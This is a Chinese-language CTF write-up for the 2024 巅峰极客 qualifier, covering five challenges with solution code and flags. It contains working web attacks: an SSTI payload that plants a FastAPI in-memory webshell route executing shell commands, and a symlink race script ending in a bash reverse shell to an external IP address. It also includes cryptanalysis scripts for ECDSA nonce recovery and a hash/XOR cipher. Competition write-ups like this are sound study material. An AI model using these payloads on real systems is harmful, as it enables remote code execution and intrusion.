---
title: 2024 巅峰极客挑战赛-初赛 Write_up
contest: 巅峰极客
year: 2024
difficulty: hard
vuln_type: [ssti, rce, ecdsa, crypto_rsa, misc_math]
tags: [FastAPI 内存马, exec 模块注入, symlink TOCTOU 竞争, ECDSA 线性组合 nonce 恢复, RSA 多 k 爆破, 哈希流密码, symlink 抢占]
attack_chain: 1. EncirclingGame: FastAPI 内存马 exec() + app.add_api_route /x → /x?x=cat /flag / 2. GoldenHornKing: ssti 无回显 → FastAPI 内存马 add_api_route / 3. sandbox: symlink 竞速 - 20 线程 symlink /usr/bin/mkdir → /sandbox/12345678/phpcode → 改写 phpcode 为 /bin/sh → 执行反弹 / 4. backdoorplus: ECDSA z = (k1 - w*t)*G + (-a*k1 - b)*Y → k1G 已知 → 推 z.x() → k2 = sha1(z.x()) → 99 次 next_prime 拿 p / 5. cipher: hash+XOR 流密码 → 已知 64 字节块加密 3 字符 (前 2 + 新 1) → 逐位爆破
key_payload: app.__init__.__globals__['__builtins__']['exec'](code) ; symlink("/usr/bin/mkdir", "/sandbox/.../phpcode") ; z = k1G - w*G - a*x*k1G - b*x*G ; k2 = int(sha1(str(z[0])).hexdigest(), 16) ; next_prime x99
one_liner: FastAPI 内存马 + symlink TOCTOU + ECDSA 线性组合 + 多 k 爆破 + 哈希流密码逐位爆破。
lesson: ECDSA nonce k 线性组合时已签名点线性组合 → 还原私钥；symlink 攻击通过并发改写 phpcode 路径。
quality: high
---
# 2024 巅峰极客挑战赛-初赛

## 1. EncirclingGame（FastAPI 内存马）

```python
import requests
url = "http://eci-2zeaztk8i992b5ljndsb.cloudeci1.ichunqiu.com:8000/"
def render(calc):
    return requests.get(f"{url}calc", params={"calc_req": calc}).text

code = '''import sys
async def ttt(x: str):
    return __import__("os").popen(x).read()
print(sys.modules["__main__"].app.add_api_route("/x", ttt))'''
render(f"""app.__init__.__globals__['__builtins__']['exec']('''{code}''')""")
print(requests.get(f"{url}x?x=cat /flag").text)
# flag{b5ae36fc-bae6-4363-af0c-58b748848019}
```

SSTI 注入 → exec 写内存马 add_api_route。

## 2. GoldenHornKing（同上）

## 3. sandbox（symlink TOCTOU 竞速）

```python
# Flask 后端: cd /sandbox/{id} && rm * && cp init.py && php phpcode
# 攻击：20 线程并发 symlink /usr/bin/mkdir → /sandbox/.../phpcode
# symlink 抢先 → mkdir 当作 phpcode 执行 → mkdir 执行不了就无效
# 等 mkdir 替换 phpcode 为 /bin/sh 后 → 主线程再读 phpcode 拿到的是 /bin/sh
import threading, requests
def test():
    s = requests.session()
    id = str(random.randint(88888888, 99999999))
    s.post(url, data={"id": id})
    code = '<?php while (true) {symlink("/usr/bin/mkdir", "/sandbox/12345678/phpcode");} ?>'
    s.post(url+"/sandbox", {"code": code})
for i in range(20): threading.Thread(target=test).start()

s1 = requests.session()
s1.post(url, data={"id": "12345678"})
while True:
    code = '#!/bin/sh\nbash -c \'bash -i >&/dev/tcp/8.134.146.39/6667 0>&1\''
    s1.post(url+"/sandbox", data={"code": code})
```

**TOCTOU**：攻击者 symlink 把 phpcode 指向 /bin/sh，PHP 读 phpcode 时是 /bin/sh → 执行。

## 4. backdoorplus（ECDSA + RSA）

```python
# z = (k1 - w*t)*G + (-a*k1 - b)*Y
# Y = X*G, t = 1
# → z = k1*G - w*G - a*k1*X*G - b*X*G
# → z = (1 - a*X)*k1*G - (w + b*X)*G
# sig_r = k1*G.x() 已知 → 还原 k1G
sig_r = 6052579169727414254054653383715281797417510994285530927615
k1G = E.lift_x(sig_r)
z = k1G - w*G - a*x*k1G - b*x*G
zx = int(z[0]) % n
k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16)
```

k1G 通过 lift_x(sig_r) 还原 → 算 z.x() → k2 = sha1 截断。

```python
p = k2
for i in range(99):
    p = gmpy2.next_prime(p)
q = gmpy2.next_prime(p)
n = p*q
phi = (p-1)*(q-1)
d = gmpy2.invert(e, phi)
m = int(pow(c, d, n))
for i in trange(99999):
    m += n
    if b'flag' in long_to_bytes(m):
        print(long_to_bytes(m))
# flag{0c75afae-f8ad-4df1-b2d9-a9ca348cb226}
```

99 次 next_prime 拿 p（爆破），再爆破 m + k*n 找含 flag 的明文。

## 5. cipher（哈希流密码逐位爆破）

```python
def encrypt(data):
    data_bytes = data.encode()
    h = hashlib.sha256()
    h.update(data_bytes)
    enc = list(h.digest())
    for i in range(len(enc)):
        enc[i] = enc[i] ^ data_bytes[i % len(data_bytes)]
    return bytes(enc).hex().upper()

# 64 字节密文，每块加密 3 字符 (前 2 已知 + 1 新字符)
flag = "flag{"
table = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
for i in range(3, 40):
    for c in table:
        for e in cipher:
            s = flag[i] + flag[i+1] + c
            if encrypt(s) == e:
                flag += c
                break
# flag{194a39a4-7937-48fb-bfea-80bd17729f8a}
```

每块 64 hex = 32 字节，3 字符密码 + 32 字节 SHA256 → 1 字符 = 32 字节密文一一映射。
